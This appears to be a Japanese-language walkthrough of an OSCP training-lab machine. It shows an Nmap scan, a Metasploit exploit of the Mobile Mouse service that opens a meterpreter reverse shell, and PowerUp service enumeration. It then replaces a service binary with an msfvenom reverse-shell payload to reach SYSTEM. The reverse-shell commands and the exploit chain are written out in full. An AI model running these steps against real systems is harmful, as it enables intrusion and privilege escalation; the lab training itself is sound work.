Nmap

┌──(kali㉿kali)-\[~/…/PEN-200_OSCP+/ChallengeLab/OSCP_C/Pascha\]

└─$ sudo nmap -Pn -n 192.168.202.155 -sCV -p- --open -oX pascha_tcp-ports.xml

\[sudo\] password for kali:

Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-10 23:42 JST

Nmap scan report for 192.168.202.155

Host is up (0.083s latency).

Not shown: 65531 filtered tcp ports (no-response)

Some closed ports may be reported as filtered due to --defeat-rst-ratelimit

PORT      STATE SERVICE VERSION

80/tcp    open  http    Microsoft IIS httpd 10.0

\|_http-title: IIS Windows

\|_http-server-header: Microsoft-IIS/10.0

\| http-methods:

\|_  Potentially risky methods: TRACE

9099/tcp  open  unknown

\| fingerprint-strings:

\|   FourOhFourRequest, GetRequest:

\|     HTTP/1.0 200 OK

\|     Server: Mobile Mouse Server

\|     Content-Type: text/html

\|     Content-Length: 321

\|_    \<HTML>\<HEAD>\<TITLE>Success!\</TITLE>\<meta name="viewport" content="width=device-width,use="font:12pt arial,geneva,sans-serif; text-align:center; color:green; font-weight:bold;" >The s/BODY>\</HTML>

9999/tcp  open  abyss?

35913/tcp open  unknown

1 service unrecognized despite returning data. If you know the service/version, please submit

![[wt image 46.png]]

ポート9099でMobileMouseが動いていることを確認しました。

既知の脆弱性があることを確認したのでMetasploitで侵入します。

msf exploit(windows/misc/mobile_mouse_rce) > show options

Module options (exploit/windows/misc/mobile_mouse_rce):

Name        Current Setting   Required  Description

----        ---------------   --------  -----------

CLIENTNAME                    no        Name of client, this shows up in the logs

PATH        c:\Windows\Temp\  yes       Where to stage payload for pull method

RHOSTS      192.168.202.155   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/usin

g-metasploit.html

RPORT       9099              yes       Port Mobile Mouse runs on (TCP)

SLEEP       3                 yes       How long to sleep between commands

SRVHOST     0.0.0.0           yes       The local host or network interface to listen on. This must be an address on the loca

l machine or 0.0.0.0 to listen on all addresses.

SRVPORT     8080              yes       The local port to listen on.

SSL         false             no        Negotiate SSL for incoming connections

SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)

URIPATH                       no        The URI to use for this exploit (default is random)

Payload options (windows/x64/meterpreter/reverse_tcp):

Name      Current Setting  Required  Description

----      ---------------  --------  -----------

EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)

LHOST     192.168.45.238   yes       The listen address (an interface may be specified)

LPORT     80               yes       The listen port

Exploit target:

Id  Name

--  ----

0   default

View the full module info with the info, or info -d command.

![[wt image 47.png]]

msf exploit(windows/misc/mobile_mouse_rce) > run

\[*\] Started reverse TCP handler on 192.168.45.238:80

\[*\] 192.168.202.155:9099 - Running automatic check ("set AutoCheck false" to disable)

\[*\] 192.168.202.155:9099 - Client name set to: OzQ5Tv

\[*\] 192.168.202.155:9099 - Connecting

\[+\] 192.168.202.155:9099 - The target appears to be vulnerable. Connected to hostname OSCP with MAC address 00:50:56:AB:A8:4A

\[*\] 192.168.202.155:9099 - Client name set to: b6qcB7bI

\[*\] 192.168.202.155:9099 - Connecting

\[*\] 192.168.202.155:9099 - Opening Command Prompt

\[*\] 192.168.202.155:9099 - Sending stager

\[*\] 192.168.202.155:9099 - Using URL: http://192.168.45.238:8080/

\[+\] 192.168.202.155:9099 - Payload request received, sending 7680 bytes of payload for staging

\[+\] 192.168.202.155:9099 - Payload request received, sending 7680 bytes of payload for staging

\[*\] 192.168.202.155:9099 - Opening Command Prompt again

\[*\] 192.168.202.155:9099 - Executing payload

\[*\] Sending stage (230982 bytes) to 192.168.202.155

/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.23/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression

\[*\] Meterpreter session 2 opened (192.168.45.238:80 -> 192.168.202.155:56092) at 2025-11-11 08:40:59 +0900

\[*\] 192.168.202.155:9099 - Server stopped.

\[!\] 192.168.202.155:9099 - This exploit may require manual cleanup of 'c:\Windows\Temp\dNOUsmk9.exe' on the target

meterpreter > shell

Process 4056 created.

Channel 2 created.

Microsoft Windows \[Version 10.0.19045.2251\]

(c) Microsoft Corporation. All rights reserved.

C:\Windows\Temp>whoami

whoami

oscp\tim

![[wt image 48.png]]

権限昇格

PowerUp.ps1をアップロード

meterpreter > upload PowerUp.ps1

\[*\] Uploading  : /home/kali/OffSec/PEN-200_OSCP+/ChallengeLab/OSCP_C/Pascha/PowerUp.ps1 -> PowerUp.ps1

\[*\] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /home/kali/OffSec/PEN-200_OSCP+/ChallengeLab/OSCP_C/Pascha/PowerUp.ps1 -> PowerUp.ps1

\[*\] Completed  : /home/kali/OffSec/PEN-200_OSCP+/ChallengeLab/OSCP_C/Pascha/PowerUp.ps1 -> PowerUp.ps1

![[wt image 49.png]]

インジェクション可能なサービスをPowerUp.ps1で確認

PS C:\Windows\Temp> powershell -ep bypass

powershell -ep bypass

Windows PowerShell

Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Windows\Temp> Import-Module .\PowerUp.ps1

Import-Module .\PowerUp.ps1

PS C:\Windows\Temp>  Invoke-AllChecks

![[wt image 50.png]]

ServiceName                     : GPGOrchestrator

Path                            : "C:\Program Files\MilleGPG5\GPGService.exe"

ModifiableFile                  : C:\Program Files\MilleGPG5\GPGService.exe

ModifiableFilePermissions       : {Delete, WriteAttributes, Synchronize, ReadControl...}

ModifiableFileIdentityReference : BUILTIN\Users

StartName                       : LocalSystem

AbuseFunction                   : Install-ServiceBinary -Name 'GPGOrchestrator'

CanRestart                      : True

Name                            : GPGOrchestrator

Check                           : Modifiable Service Files

ServiceName   : GPGOrchestrator

Path          : "C:\Program Files\MilleGPG5\GPGService.exe"

StartName     : LocalSystem

AbuseFunction : Invoke-ServiceAbuse -Name 'GPGOrchestrator'

CanRestart    : True

Name          : GPGOrchestrator

Check         : Modifiable Services

![[wt image 51.png]]

サービスの確認

PS C:\Program Files\MilleGPG5> get-service

サービスの停止

PS C:\Program Files\MilleGPG5> stop-service -name GPGOrchestrator

バイナリ名の変更

ぺyロードの作成

┌──(kali㉿kali)-\[~/…/PEN-200_OSCP+/ChallengeLab/OSCP_C/Pascha\]

└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.238 LPORT=4444 -f exe > GPGService.exe

\[-\] No platform was selected, choosing Msf::Module::Platform::Windows from the payload

\[-\] No arch selected, selecting arch: x64 from the payload

No encoder specified, outputting raw payload

Payload size: 460 bytes

Final size of exe file: 7680 bytes

リバースシェルの待ち受け

サービスのスタート

PS C:\Program Files\MilleGPG5> start-service -name GPGOrchestrator

┌──(kali㉿kali)-\[~/…/PEN-200_OSCP+/ChallengeLab/OSCP_C/Pascha\]

└─$ rlwrap -cAr nc -lvnp 4444

listening on \[any\] 4444 ...

connect to \[192.168.45.238\] from (UNKNOWN) \[192.168.202.155\] 53706

Microsoft Windows \[Version 10.0.19045.2251\]

(c) Microsoft Corporation. All rights reserved.

C:\Program Files\MilleGPG5>whoami

whoami

oscp\tim

C:\Program Files\MilleGPG5>whoami

whoami

oscp\tim

C:\Program Files\MilleGPG5>exit

exit

┌──(kali㉿kali)-\[~/…/PEN-200_OSCP+/ChallengeLab/OSCP_C/Pascha\]

└─$ rlwrap -cAr nc -lvnp 4444

listening on \[any\] 4444 ...

connect to \[192.168.45.238\] from (UNKNOWN) \[192.168.202.155\] 53784

Microsoft Windows \[Version 10.0.19045.2251\]

(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami

whoami

nt authority\system